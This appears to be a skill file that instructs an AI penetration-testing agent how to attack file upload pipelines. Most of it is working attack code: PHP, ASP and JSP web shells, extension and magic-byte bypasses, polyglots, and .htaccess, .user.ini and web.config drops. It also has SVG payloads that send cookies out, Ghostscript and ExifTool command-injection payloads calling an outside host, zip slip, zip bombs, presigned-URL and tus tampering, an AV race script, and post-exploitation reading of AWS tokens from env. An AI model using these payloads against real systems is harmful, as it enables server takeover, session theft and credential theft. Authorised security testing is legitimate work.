# Insecure File Uploads Attack Skill

End-to-end workflow for weaponising file upload pipelines, covering server-side execution via web shells and config drops, stored XSS via SVG and HTML, magic-byte and double-extension bypass of allowlists, parser-toolchain abuse (ImageMagick, Ghostscript, ExifTool), zip slip and zip-bomb on archive ingest, presigned cloud-storage misuse, late-stage metadata swaps in resumable multipart APIs, AV/CDR processing races, and content disposition / nosniff render abuse. Use this skill when the request centres on a multipart upload, presigned PUT/POST flow, avatar/document/import endpoint, or background ingest queue that accepts attacker-controlled bytes.

## When to Classify Here

Pick this skill when the user wants to drive bytes through an upload boundary and bend the post-upload pipeline. Concrete triggers:

- Drop a PHP / ASP / JSP / .NET shell through an avatar, document, or attachment endpoint and reach it back
- Land stored XSS via SVG, HTML, or a sniffed file served inline
- Bypass extension or MIME allowlists with double extensions, mixed case, magic-byte spoofing, polyglot files, or null-byte tricks
- Coerce ImageMagick, GraphicsMagick, Ghostscript, or ExifTool conversion paths into shell or file disclosure
- Smuggle privileged config files (`.htaccess`, `.user.ini`, `web.config`, `.env`) into a writable directory served by the same handler
- Walk archive ingest with zip-slip entries, symlinks-in-zip, password-protected archives that skip AV, or zip bombs
- Hijack resumable / chunked upload protocols (tus, S3 multipart) by swapping `Content-Type` or `Content-Disposition` between init and finalize
- Abuse presigned S3 / GCS / Azure URLs by tampering with `Content-Type`, `Content-Disposition`, ACL, or object key prefix
- Beat AV / CDR scanners by accessing the file before the scan completes, or by hiding payloads inside password-protected archives
- Force inline render through reflected `Content-Type` or missing `X-Content-Type-Options: nosniff`

Trigger keywords: file upload, insecure upload, web shell upload, .htaccess drop, .user.ini, web.config upload, multipart upload, avatar bypass, image upload bypass, magic bytes, GIF89a polyglot, double extension, zip slip, zip bomb, archive traversal upload, ImageMagick exploit, MVG SVG exploit, Ghostscript escape, ExifTool injection, EICAR, presigned S3 upload, presigned PUT, S3 ACL bypass, content-disposition inline, content-type sniffing, X-Content-Type-Options bypass, tus upload, resumable upload finalize, processing race, AV bypass upload, polyglot upload, SVG XSS upload, HTML upload XSS, file upload RCE, shell upload, PHAR upload polyglot.

### Disjoint from neighboring skills

- **vs. built-in `rce`**: rce covers command injection, eval sinks, OGNL/SpEL, template injection, and named CVEs. Pick this skill when the entry point is a multipart body, a presigned object key, or any pipeline that ingests opaque bytes; pivot to rce only after a shell has landed and you need to escalate from a stable foothold.
- **vs. built-in `xss`**: xss is reflected or DOM injection inside an HTML response. Insecure uploads land script via a stored asset (SVG, HTML, polyglot) that the server later serves. If the bug is "the server stored my file and renders it inline", this skill owns it; if the bug is "this query parameter ends up in the page", that is xss.
- **vs. built-in `path_traversal`**: path traversal walks file-system parameters with `../` or PHP wrappers in a path argument. Upload abuse may include filename traversal, but the primary surface is the byte boundary itself; archive zip-slip and `Content-Disposition` filename traversal stay here, while `?file=../../etc/passwd` belongs in path_traversal.
- **vs. built-in `cve_exploit`**: pick cve_exploit when the user names a published CVE plus a Metasploit module. Pick this skill when the target is a custom upload pipeline or a generic toolchain misconfig (ImageMagick policy gaps, ExifTool argument injection on older versions) without a one-shot module.
- **vs. built-in `sql_injection` / community `sqli_exploitation`**: never overlap; uploads hit the file-system and rendering layers, not the SQL parser.
- **vs. built-in `brute_force_credential_guess`**: assumes the operator already holds credentials sufficient to reach the upload endpoint.
- **vs. community `xxe`**: pick xxe when an XML body is the entry point (SOAP, SAML, RSS, plain XML POST). When the XML lives inside an uploaded file the parser later opens (SVG XInclude, OOXML embedded XML, ODT manifest, RSS feed import), prefer xxe for the parser-level proof and reference this skill from there for the filename / Content-Type / serving-header context. Heuristic: "the parser opens my XML" -> xxe; "the server stores my file and serves it" -> here.
- **vs. community `insecure_deserialization`**: deserialization is a byte-stream-level gadget chain at a `readObject` / `unserialize` / `pickle.loads` sink. Uploads enter the same skill family only for the PHAR-via-upload sub-step, and that step belongs in insecure_deserialization once you have shown the upload sink. If the goal is "drop a PHAR and trigger it via `phar://` later", route the work to insecure_deserialization and only borrow Phase 2.4 here for the polyglot crafting.
- **vs. community `api_testing`**: api_testing is the broad API survey (JWT, GraphQL, REST, 403). It mentions uploads only in passing. Pick this skill when the workflow is upload-centric.
- **vs. community `mass_assignment`, `bfla_exploitation`, `idor_bola_exploitation`**: each owns an authorization or binder layer that is one level above the upload pipeline. If the user wants to escalate by smuggling fields, escalate verbs, or swap object IDs around the upload, drive that skill and re-enter here only for the byte-content step.
- **vs. community `subdomain_takeover`**: never overlap.

## Tools

This workflow uses only tools already present in the agent runtime. No new Kali packages are required for the documented steps.

- `query_graph` to inventory upload endpoints, MIME hints, parameters, and known technologies from prior recon
- `execute_curl` for crafted multipart bodies, presigned PUT/POST flows, header rotation, and follow-up GETs against the served file
- `kali_shell` for one-off CLI tasks: `xxd` for magic-byte inspection, `zip` for archive crafting, `printf` for binary header injection, `interactsh-client` for OOB callbacks, `jq` for JSON inspection, `dig` for DNS callback verification
- `execute_code` (Python) for byte-level payload crafting (magic-byte spoofing, polyglot construction, OOXML / ODT repackaging, EXIF / XMP injection, zip-slip and symlink-in-zip generation, EICAR variants, presigned URL signing tests) and for orchestrating multi-step upload-then-fetch loops
- `execute_playwright` to capture authenticated cookies / CSRF tokens from real upload UIs when the API path is opaque, and to confirm browser-side behaviour (inline render vs. attachment) on the served URL
- `execute_nuclei` for opportunistic checks against published upload-handler templates after a candidate endpoint is identified

If the operator forbids OOB callbacks, drop the `interactsh-client` step and lean on reflective probes, error-message diffing, and timing oracles instead.

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, redamon.replay re-sends a captured multipart upload with a mutated filename, Content-Type, or body (extension rotation, polyglot magic bytes, a config-file drop, a traversal filename), recorded as a new replay txn. redamon.get then fetches the served file back and redamon.grep inspects the response for execution or inline render plus the load-bearing headers (Content-Type, Content-Disposition, X-Content-Type-Options). Where the proxy stops: byte-level polyglot and toolchain payload crafting still needs execute_code, and stored-XSS or toolchain-RCE proof needs execute_playwright (real browser) or an OOB collector.

## Workflow

### Phase 1: Reconnaissance (Informational)

The goal of Phase 1 is to map every upload boundary the application exposes, classify the post-upload pipeline (storage, processors, serving), and capture a baseline for legitimate uploads so Phase 2 has a clean diff to work against. Do not attempt to land an executable payload yet.

1. **Inventory upload surfaces from the recon graph.** Use `query_graph` to find candidate endpoints already discovered by the crawler:
   ```
   MATCH (e:Endpoint) WHERE e.project_id = $project_id
     AND (e.method IN ['POST','PUT','PATCH']
          AND (e.url =~ '(?i).*/(upload|uploads|file|files|attach|attachment|media|image|images|avatar|photo|photos|document|documents|asset|assets|import|importer|backup|template|report|cv|resume|export|signed|presigned|s3|gcs|blob).*'
               OR e.content_type =~ '(?i).*multipart/form-data.*'))
   RETURN e.url, e.method, e.content_type, e.status_code
   ORDER BY e.url
   ```
   Pull suspicious parameter names that hint at upload metadata:
   ```
   MATCH (p:Parameter) WHERE p.project_id = $project_id
     AND p.name =~ '(?i)(file|files|upload|attach|attachment|avatar|image|photo|document|asset|content_type|contentType|content-disposition|key|bucket|acl|prefix|filename|objectKey|x-amz-meta-).*'
   RETURN p.url, p.name, p.method
   ```
   Note any presigned-URL hand-off endpoints (the server returns a signed URL, the client PUTs the bytes directly to S3 / GCS / Azure).

2. **Classify the pipeline per endpoint.** For each candidate, decide:
   - Is the file served back by the application directly, by an object store, or by a CDN?
   - Is there a background processor (thumbnail, PDF render, virus scan, OCR)?
   - Is the upload synchronous (response carries the final URL) or asynchronous (job id, then status polling)?
   - Which transports does the same logical upload accept (REST, GraphQL `Upload` scalar, tus, S3 multipart, raw `PUT`)?

3. **Capture a legitimate baseline.** Send one minimal upload of each claimed type with `execute_curl` and record the response, the resulting URL, and the served response headers:
   ```bash
   # 1x1 PNG baseline
   printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc\xf8\xff\xff?\x00\x05\xfe\x02\xfe\xa3\xa3\x99\xa6\x00\x00\x00\x00IEND\xaeB`\x82' > /tmp/baseline.png
   curl -sk -X POST "https://<target>/api/upload" \
     -H "Authorization: Bearer $TOKEN" \
     -F "file=@/tmp/baseline.png;type=image/png" -i | tee /tmp/up.baseline.txt
   ```
   ```bash
   # GET the served URL and capture the headers that decide browser behaviour
   curl -sk -D - -o /tmp/baseline.served "https://<served-url-from-response>" | head -30
   ```
   Note `Content-Type`, `Content-Disposition`, `X-Content-Type-Options`, `Cache-Control`, and the host that serves the file (app domain, bucket domain, CDN domain). The header set is the load-bearing artifact for Phase 2.

4. **Fingerprint validation and processors.** Send a controlled set of probe files via `execute_curl` and diff the resulting pipeline behaviour:
   - PNG with a JPEG magic byte header (extension / magic disagree)
   - JPEG with a `<?php` trailer (probe whether content inspection runs)
   - GIF89a header followed by `<script>alert(1)</script>` (probe sniffing on the served route)
   - Plain text with `.png` extension (probe pure extension trust)
   - Tiny SVG with no scripting (probe whether SVG is served as `image/svg+xml` and rendered inline)
   - 100 KB ZIP, 10 MB ZIP, 100 MB ZIP (probe size limits and async processor timing)
   For each probe record: HTTP status, response body, served Content-Type, served Content-Disposition, X-Content-Type-Options, processing latency.

5. **Enumerate the storage and serving topology.** When the app issues a presigned upload URL, capture the full payload:
   ```bash
   curl -sk "https://<target>/api/sign-upload?filename=test.png&contentType=image/png" \
     -H "Authorization: Bearer $TOKEN" -i | tee /tmp/presign.txt
   ```
   Inspect with `kali_shell`:
   ```bash
   jq -r '.fields, .url, .key' /tmp/presign.txt 2>/dev/null || cat /tmp/presign.txt
   ```
   Note which fields the client controls (`Content-Type`, `Content-Disposition`, `acl`, `x-amz-meta-*`, `key`) and which are signed by the server. Anything client-controllable that the server later trusts is a Phase 2 target.

6. **Stand up an OOB collector** (used in Phase 2 for blind toolchain hits and async processor probing):
   ```bash
   interactsh-client -v -o /tmp/upload-oast.log &
   sleep 3 && grep -E "https?://[a-z0-9.-]+oast\." /tmp/upload-oast.log | tail -1
   ```
   Save the issued domain. Phase 2 will inject it into ImageMagick MVG payloads, Ghostscript `%pipe%` chains, ExifTool URL fields, and OOXML hyperlinks.

7. **Build the upload x outcome matrix.** For each upload endpoint discovered, list the test families that apply: extension games, MIME swap, magic-byte spoof, polyglot, archive ingest, presigned tampering, resumable-finalize swap, processor exploit, header-driven render. The matrix tells you which Phase 2 sub-steps to run and which to skip.

8. **Choose the verification oracle.** Decide up front how Phase 2 will prove a hit:
   - Reflective: GET the served file, observe execution / inline render in a real browser via `execute_playwright`
   - Server-side: trigger the uploaded shell, capture command output in the response
   - OOB: record an interactsh callback from a toolchain payload (ImageMagick `url()`, OOXML hyperlink, ExifTool URL field)
   - Side-effect: the application reads or processes the file in a way visible through a follow-up API (thumbnail URL, virus-scan status flip, search index hit, audit log)

When at least one upload endpoint is mapped, the served response headers are captured, the OOB collector is live, and the verification oracle is chosen, **request transition to exploitation phase**.

### Phase 2: Exploitation

Run probes in roughly the listed order. Stop escalating as soon as a single technique produces verified execution or inline render against the chosen oracle. Always re-fetch the served URL after every successful upload, with the headers the browser would send, before calling a finding confirmed.

#### 2.1 Server-side execution via web shell drop

Before crafting bypasses, try the simplest path: a plain shell with the language extension.

```bash
# PHP one-liner shell (use only if the storage path is served by PHP)
echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/shell.php
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php;type=application/x-php"
```
```bash
# Reach back to confirm execution
curl -sk "https://<served-url>/shell.php?c=id"
```
Run the equivalent for ASP / ASPX (`<%= eval(Request("c")) %>`), JSP (`<%= Runtime.getRuntime().exec(request.getParameter("c")).getInputStream() %>`), or `.cgi` where applicable. Record the served URL, the response, and whether the file landed under a handler-mapped directory.

#### 2.2 Extension allowlist bypass

When the raw extension is rejected, exhaust the rotation list:

```bash
# Double extension (Apache module mis-config, IIS legacy)
for name in shell.php.jpg shell.php.png shell.php.gif shell.php5 shell.phtml shell.phar shell.pht shell.phps shell.pHp shell.PhP; do
  cp /tmp/shell.php "/tmp/$name"
  curl -sk -X POST "https://<target>/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/$name;type=image/jpeg" -w '\n%{http_code}\n'
done
```
```bash
# Unicode dot, trailing dot, trailing space, null-byte (legacy stacks)
for name in 'shell.php%00.png' 'shell.php.' 'shell.php ' 'shell.php\u200d' 'shell.php\x00.jpg' 'shell..php' 'shell%2ephp'; do
  printf '%s' "$name" | xxd
  curl -sk -X POST "https://<target>/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/shell.php;filename=$name;type=image/png"
done
```
```bash
# Multipart filename / name / Content-Disposition disagreement
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: multipart/form-data; boundary=X" \
  --data-binary $'--X\r\nContent-Disposition: form-data; name="file"; filename="ok.png"; filename*=UTF-8\'\'shell.php\r\nContent-Type: image/png\r\n\r\n<?php echo 1; ?>\r\n--X--\r\n'
```
For each accepted variant, fetch the served URL, capture the response `Content-Type`, and try to execute. A file accepted but served as `text/plain` with `Content-Disposition: attachment` is NOT a hit on its own; mark it as a Phase-2.5 candidate (header abuse) instead.

#### 2.3 Magic-byte and polyglot crafting

Build a file that satisfies the validator (looks like the claimed type) AND carries the executable payload. Use `execute_code` for byte-level control:

```python
# execute_code -- GIF89a / PHP polyglot
payload = b"GIF89a;\n<?php echo shell_exec($_GET['c']); ?>\n"
open('/tmp/shell.gif.php', 'wb').write(payload)

# JPEG header / PHP polyglot (works behind extension allowlists that look at first bytes)
JPEG_HEADER = bytes.fromhex('FFD8FFE000104A4649460001010000010001000000FFDB')
open('/tmp/shell.jpg.php', 'wb').write(JPEG_HEADER + b'\xff' * 16 + b"\n<?php echo shell_exec($_GET['c']); ?>\n" + bytes.fromhex('FFD9'))

# PNG / HTML polyglot for stored XSS via sniffing
PNG_HEADER = bytes.fromhex('89504E470D0A1A0A0000000D49484452000000010000000108060000001F15C489')
open('/tmp/x.png', 'wb').write(PNG_HEADER + b'<script>alert(document.domain)</script>')
```
Send each polyglot through the upload flow with the extension and `Content-Type` that the validator actually checks. Then fetch the served URL and look for: parser execution (PHP echo), inline script in the response body when sniffed, or 200 OK with the expected magic header preserved.

```bash
# Validate magic bytes survived the pipeline
curl -sk "https://<served-url>" -o /tmp/served.bin
xxd /tmp/served.bin | head -3
```

#### 2.4 Config drops (Apache, PHP-FPM, IIS, .NET)

Some pipelines write the upload into a directory that is also a request handler. Test config-file drops directly:

```bash
# .htaccess -- map any uploaded extension to PHP
cat > /tmp/.htaccess <<'EOF'
AddType application/x-httpd-php .png .jpg .gif .txt
<FilesMatch "shell\.png$">
    SetHandler application/x-httpd-php
</FilesMatch>
EOF
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/.htaccess;type=text/plain"
```
```bash
# .user.ini -- PHP-FPM auto_prepend_file
cat > /tmp/.user.ini <<'EOF'
auto_prepend_file = "shell.png"
EOF
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/.user.ini;type=text/plain"
```
```bash
# IIS web.config drop
cat > /tmp/web.config <<'EOF'
<?xml version="1.0"?>
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
<add name="rce" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\System32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
</handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config"/></fileExtensions></requestFiltering></security>
</system.webServer></configuration>
EOF
```
For each accepted config drop, place a paired payload with a benign extension (`.png`, `.txt`) and confirm the handler now interprets it. A successful `.htaccess` upload that flips a benign-named file into PHP execution is the cleanest possible RCE proof.

#### 2.5 Stored XSS via SVG and HTML

When server-side execution is unreachable, aim for client-side execution via the served file:

```bash
# Inline SVG with onload handler
cat > /tmp/x.svg <<'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script type="application/ecmascript">fetch('https://<oob>/'+document.cookie)</script>
</svg>
EOF
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/x.svg;type=image/svg+xml"
```
```bash
# Plain HTML uploaded as image -- works when nosniff is missing
echo '<html><body><script>alert(document.domain)</script></body></html>' > /tmp/x.html
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/x.html;type=image/png" --output -
```
After upload, drive `execute_playwright` to load the served URL in a real browser session (matching the victim role). Confirm the alert fires, or that an outbound fetch to the OOB collector lands. A 200 OK with `Content-Type: image/svg+xml` and no `Content-Disposition: attachment` is sufficient; a 200 OK with `Content-Disposition: attachment; filename=...` plus `nosniff` is NOT a hit.

#### 2.6 Toolchain exploits (ImageMagick, GraphicsMagick, Ghostscript, ExifTool)

When a converter sits between upload and serve (thumbnail render, PDF preview, EXIF strip), the converter itself becomes the sink.

```bash
# ImageMagick MVG -- legacy `url()` and `label:@/etc/passwd` (mitigated by policy.xml in modern installs;
# still found on long-running images and forks)
cat > /tmp/exploit.svg <<'EOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="640" height="480">
  <image xlink:href="url(https://<oob>/im-svg)" width="100" height="100"/>
  <text x="10" y="20">label:@/etc/passwd</text>
</svg>
EOF
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/exploit.svg;type=image/svg+xml"
```
```bash
# Ghostscript via crafted PDF / PostScript using %pipe% (CVE-2018-16509 family + later regressions)
cat > /tmp/x.eps <<'EOF'
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%curl https://<oob>/gs) currentdevice putdeviceprops
EOF
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/x.eps;type=application/postscript"
```
```bash
# ExifTool argument injection (CVE-2021-22204) -- crafted DjVu metadata
# Requires older exiftool; emit via execute_code so the bytes are exact.
```
```python
# execute_code -- ExifTool CVE-2021-22204 minimal trigger
payload = b'\x41\x54\x26\x54FORM\x00\x00\x00\x57DJVMDIRM\x00\x00\x00\x29\x00\x01\x00\x00\x00\x05\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x46\x4f\x52\x4d\x00\x00\x00\x16\x44\x4a\x56\x49ANTa\x00\x00\x00\x09(metadata "\\\n" . qx{curl https://<oob>/exif} . "\\\n")'
open('/tmp/poc.djvu', 'wb').write(payload)
```
After uploading each toolchain payload, watch the OOB collector. A DNS or HTTP hit attributed to the target is execution proof even when the response body looks like a normal thumbnail.

#### 2.7 Archive ingest -- zip slip, symlinks, zip bombs

When the upload is a `.zip`, `.tar`, `.tar.gz`, `.7z`, or office document (which is just a zip), the extractor becomes the sink.

```python
# execute_code -- zip slip (write outside the extraction directory)
import zipfile
with zipfile.ZipFile('/tmp/zipslip.zip', 'w') as z:
    z.writestr('../../../../../../var/www/html/shell.php',
               '<?php echo shell_exec($_GET["c"]); ?>')
    z.writestr('benign.txt', 'ok')
```
```python
# execute_code -- symlink-in-zip pointing at a host file (read primitive)
import os, zipfile
os.symlink('/etc/passwd', '/tmp/link_passwd')
with zipfile.ZipFile('/tmp/symlink.zip', 'w', zipfile.ZIP_STORED) as z:
    z.write('/tmp/link_passwd', arcname='passwd')
```
```python
# execute_code -- zip bomb (only fire when DoS is in scope)
import zipfile
with zipfile.ZipFile('/tmp/bomb.zip', 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('big.txt', '0' * (1024 * 1024 * 50))
```
```bash
curl -sk -X POST "https://<target>/api/import" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/zipslip.zip;type=application/zip"
```
For zip slip, the proof is a follow-up read of the file at the traversed path (via the upload pipeline itself, a public path, or another bug). For symlinks, the proof is the served file containing the host file's contents. For zip bombs, restrict to authorised DoS testing only and stop at the first sustained latency spike.

Repeat the same archive set against any docx / xlsx / pptx / odt / odf import endpoint; office formats are zips and frequently share the same extractor flaw.

#### 2.8 Presigned cloud-storage abuse

When the server hands the client a signed URL, the validator sometimes only locks the path while leaving headers free.

```bash
# 1. Ask for a signed URL with a benign type
curl -sk "https://<target>/api/sign?filename=ok.png&contentType=image/png" \
  -H "Authorization: Bearer $TOKEN" -o /tmp/sign.json

# 2. PUT bytes that DO NOT match the claimed Content-Type
SIGNED_URL=$(jq -r '.url' /tmp/sign.json)
curl -sk -X PUT "$SIGNED_URL" \
  -H "Content-Type: text/html" \
  -H "Content-Disposition: inline; filename=evil.html" \
  --data-binary '<html><script>alert(document.domain)</script></html>'
```
```bash
# 3. Read it back and confirm the bucket honours your headers
curl -sk -I "<served-url>"
```
Test variants:
- Override `Content-Type` between sign and upload (`image/svg+xml`, `text/html`, `application/x-msdownload`)
- Override `Content-Disposition: inline` to force render
- Inject `x-amz-acl: public-read` if not signed
- Bend the `key` to escape a tenant prefix (`?key=user-1234/avatar.png` -> `?key=../admin/welcome.html`)
- Replay a stale signed URL after the legitimate upload to overwrite the same key

For S3 POST policies, decode the policy with `kali_shell`:
```bash
jq -r '.fields["policy"]' /tmp/sign.json | base64 -d | jq .
```
Look for `Content-Type` not in the conditions list, missing `starts-with` lock on `key`, missing `eq` on ACL.

#### 2.9 Resumable / chunked / late-finalize swaps

For tus, S3 multipart, and Google resumable uploads, the auth check often runs at init while the real bytes ship later. Test header swaps between init and finalize:

```bash
# Init with image/png
curl -sk -X POST "https://<target>/files/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Tus-Resumable: 1.0.0" \
  -H "Upload-Length: 1024" \
  -H "Upload-Metadata: filename b2sucG5n,contentType aW1hZ2UvcG5n" \
  -i | tee /tmp/tus.init.txt

# Stream PHP bytes
LOC=$(grep -i '^location:' /tmp/tus.init.txt | awk '{print $2}' | tr -d '\r')
curl -sk -X PATCH "$LOC" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Tus-Resumable: 1.0.0" \
  -H "Upload-Offset: 0" \
  -H "Content-Type: application/offset+octet-stream" \
  --data-binary $'<?php echo shell_exec($_GET["c"]); ?>'

# Finalize with a forged Content-Type / filename in metadata
curl -sk -X PATCH "$LOC" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Upload-Metadata: filename c2hlbGwucGhw,contentType YXBwbGljYXRpb24veC1waHA=" \
  -H "Tus-Resumable: 1.0.0"
```
Mirror the same idea on S3 multipart: pre-sign a `CreateMultipartUpload` for `image/png`, then `CompleteMultipartUpload` with parts that decode to PHP. The serve-time `Content-Type` is whatever you finalize with; the validator only saw the init.

#### 2.10 Filename and path tricks

When the storage layer trusts the original filename, walk it:

```bash
# Path traversal in the multipart filename
for name in '../../../../../../var/www/html/shell.php' \
            '..\\..\\..\\..\\..\\windows\\temp\\shell.php' \
            '/var/www/html/shell.php' \
            '....//....//....//etc/cron.hourly/r' \
            '../shell.png/.htaccess'; do
  curl -sk -X POST "https://<target>/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/shell.php;filename=$name;type=image/png"
done
```
```bash
# Unicode and reserved-name tricks
for name in 'shell\u200d.png' 'CON.png' 'aux.php' 'shell.php:.png' 'shell.php::$DATA' 'shell.php/'; do
  curl -sk -X POST "https://<target>/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/shell.php;filename=$name;type=image/png"
done
```
After every accepted variant, GET the served URL set and any predictable storage path (`/uploads/<token>/<filename>`) to confirm the file landed at the expected (or unexpected) location.

#### 2.11 Processing race -- access before scan

Many pipelines accept an upload, mark it pending, and only run AV / CDR asynchronously. Race the access window:

```python
# execute_code -- upload then immediately fetch in parallel
import asyncio, httpx

URL_UP = "https://<target>/api/upload"
URL_GET_TEMPLATE = "https://<served-domain>/uploads/{token}/shell.php"
HEADERS = {"Authorization": "Bearer $TOKEN"}

async def race():
    async with httpx.AsyncClient(verify=False, timeout=30) as c:
        with open('/tmp/shell.php', 'rb') as f:
            up = await c.post(URL_UP, headers=HEADERS,
                              files={"file": ("shell.php", f, "application/x-php")})
        token = up.json()["token"]
        for _ in range(50):
            r = await c.get(URL_GET_TEMPLATE.format(token=token) + "?c=id")
            if r.status_code == 200 and r.text.strip().startswith("uid="):
                print("HIT", r.text)
                break
            await asyncio.sleep(0.05)
asyncio.run(race())
```
Pair this with EICAR (`X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`) to map the AV behaviour:
```bash
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
curl -sk -X POST "https://<target>/api/upload" -F "file=@/tmp/eicar.com" -i
```
A 200 OK plus an immediate fetch hit before the AV catches up is a clean processing-race finding. A 200 OK with EICAR untouched is a hard finding on its own.

#### 2.12 Header-driven render abuse

When the byte content cannot reach execution, force the served headers to render the file inline:

```bash
# Probe whether the upload echoes the Content-Type the client supplies
curl -sk -X POST "https://<target>/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/x.html;type=text/html;filename=evil.html"
curl -sk -D - -o /dev/null "<served-url>"
```
Look for:
- `Content-Type: text/html` reflected from the multipart Content-Type
- `Content-Disposition: inline` instead of `attachment`
- Missing `X-Content-Type-Options: nosniff`
- A wildcard `Access-Control-Allow-Origin` on the served response (turns a benign-looking JSON file into a cross-origin script source)
- Cache-Control configured so the CDN keys without `Vary` on `Content-Type` (cache poisoning for the served path)

When at least one header is attacker-controllable and the served `Content-Type` is browser-renderable, you have a Phase-2 hit even without a parser bypass.

#### 2.13 Bypass exhaustion before declaring not exploitable

Before classifying an upload boundary as hardened, run the full battery from Phase 2.1 through 2.12 across every transport the target exposes (REST multipart, GraphQL `Upload`, tus / resumable, presigned PUT/POST, raw `PUT`). Document each rejected variant with the request shape, the response, and the exact rejection reason. A finding that names "10 distinct bypass families failed identically" is far stronger than one that stops after the first 403.

### Phase 3: Post-Exploitation and Impact Demonstration

A 200 OK on the upload is not the finding. Convert the primitive into observable impact and clean up.

1. **Land the proof.** For server-side execution, capture command output in the response (`id`, `hostname`, `cat /etc/passwd` first 10 lines). For stored XSS, capture the OOB callback with the victim's cookie / token. For toolchain exploits, capture the OOB callback attributed to the converter host. For zip slip, fetch the file from its traversed location.

2. **Pivot from the foothold.** When a shell lands, list the service account, environment, and writable directories with `id`, `whoami`, `env | grep -i AWS|TOKEN|SECRET`, `ls -la /var/www/uploads`, and `mount`. Stop at enumeration; if the user wants persistence or lateral movement, hand off to the `rce` built-in.

3. **Cross-channel parity sweep.** Replay the winning payload through every related upload route discovered in Phase 1 (mobile API, GraphQL upload, admin importer, webhook ingest, async background queue). Different validators per route is one of the loudest patterns; finding two sibling routes with mismatched checks strengthens the report.

4. **Authenticated render confirmation.** For stored XSS, drive `execute_playwright` against the served URL with a victim-equivalent session and capture both the alert event and a screenshot. A console-only alert from a curl probe is weaker than a real-browser render.

5. **Audit-log inspection (when in scope).** Fetch the audit log as the basic actor and compare to the admin view. Note whether the upload is attributed to the basic actor, anonymously, or to a service account; silent failures are far more dangerous and worth flagging.

6. **Cleanup.** Delete dropped shells, config files, and zip-slip artifacts wherever you wrote them. Roll back any flag flips or feature-gate changes triggered by the upload pipeline. Note any file you could not revert in the report.

## Proof of Exploitation Levels

Use these tiers when reporting. Reaching at least Level 3 is required to classify a finding as EXPLOITED.

- **Level 1 - Validation gap shown**: file accepted with a privileged extension, polyglot magic, or smuggled config name, but no execution / render / disclosure produced. Classification: POTENTIAL (low confidence).
- **Level 2 - Pipeline anomaly confirmed**: served `Content-Type` reflects attacker input, `Content-Disposition: inline` on a sniffable file, OOB callback from a converter, AV bypass shown for EICAR, or zip-slip wrote to a non-served path. Classification: POTENTIAL (medium confidence).
- **Level 3 - Code or render execution proven**: web shell returns command output, SVG / HTML triggers JavaScript in a real browser session, ImageMagick / Ghostscript fires an authenticated OOB callback, zip slip places a reachable file under a public root, or signed-URL tampering produces an inline-rendered HTML page from a trusted bucket domain. Classification: EXPLOITED.
- **Level 4 - Critical pipeline compromise**: shell on the application or processor host with environment-variable / token disclosure, OS command execution proven beyond `id`, AV-evading malware drop confirmed, full bucket takeover via key prefix break, or chained finding (upload -> render -> session theft -> account takeover). Classification: EXPLOITED (CRITICAL).

A finding only ships as EXPLOITED when (a) the upload was accepted, (b) the served file produced execution / render / disclosure on the chosen oracle, and (c) the proof was reproducible from a clean curl invocation against the served URL.

## Reporting Guidelines

For every confirmed finding, include:

- **Vulnerability class**: extension allowlist bypass / magic-byte spoof / polyglot RCE / config drop / SVG or HTML stored XSS / toolchain exploit / archive zip slip / archive symlink read / processing race / presigned-URL tampering / resumable-finalize swap / header-driven render
- **Affected endpoint**: full URL, HTTP method, accepted Content-Type, the parameter name carrying the bytes, and which transport (REST multipart, GraphQL, tus, S3 multipart, presigned PUT)
- **Pipeline topology**: storage location, processor used (if any), serving host (app, bucket, CDN), and which step the bypass exploited
- **Triggering request** as a copy-pasteable code block with full headers; replace secrets with `[TOKEN]` style placeholders so the deliverable is shareable
- **Served response**: HTTP status, Content-Type, Content-Disposition, X-Content-Type-Options, host, and any cache headers
- **Proof of impact**: command output for shells, browser screenshot or OOB callback for stored XSS, OOB callback for toolchain hits, follow-up read for zip slip, before / after for header abuse
